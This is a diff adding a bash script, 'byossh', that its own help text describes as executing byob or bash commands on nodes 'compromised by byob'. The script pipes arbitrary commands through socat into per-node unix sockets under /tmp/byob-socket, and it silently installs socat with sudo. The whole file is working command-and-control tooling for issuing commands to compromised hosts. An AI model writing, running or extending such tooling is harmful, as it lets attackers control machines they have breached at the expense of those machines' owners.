@@ -1,0 +1,69 @@
+#!/bin/bash
+
+set -e
+
+node=""
+time="5"
+command=""
+
+if ! command -v socat &> /dev/null; then 
+    echo "installing socat"; 
+    sudo apt install -y socat; 
+fi
+
+show_help() {
+    echo -e "Usage: ./byossh [flags] [node] [command]"
+    echo -e ""
+    echo -e "This command executes byob or bash commands on nodes compromised by byob"
+    echo -e ""
+    echo -e "-h/--help shows this menu"
+    echo -e "-t sets the delay program should wait for the command to complete, so we can print it to screen"
+    echo -e "\t'-t 5' is recommended and the default"
+    echo -e ""
+    echo -e "[node] is the compromised node you'd like to exectue commands on"
+    echo -e "\tthere must a correspondig valid unix socket at /tmp/byob-socket"
+    echo -e "[command] is the command you'd like to execute on the remote node"
+    echo -e ""
+}
+
+
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        -h | --help)
+            show_help
+            shift
+            ;;
+        -t)
+            shift
+            time="$1"
+            shift
+            ;;
+
+        *)
+            if [ "$node" = "" ]; then
+                node="$1"
+                shift
+            else 
+                command="$@"
+                shift "$#"
+            fi
+            ;;
+    esac
+done
+
+
+if [ "$node" = "" ] || [ "$command" = "" ]; then
+    echo "improperly formatted input"
+    show_help
+    exit 1
+fi
+
+
+if [ ! -S /tmp/byob-socket/$node ]; then
+    echo "unix socket /tmp/byob-socket/$node doesn't exist"
+    echo "cannot execute remote command"
+    exit 1
+fi
+
+echo "$command" | socat "-t$time" - "UNIX-CONNECT:/tmp/byob-socket/$node"
+
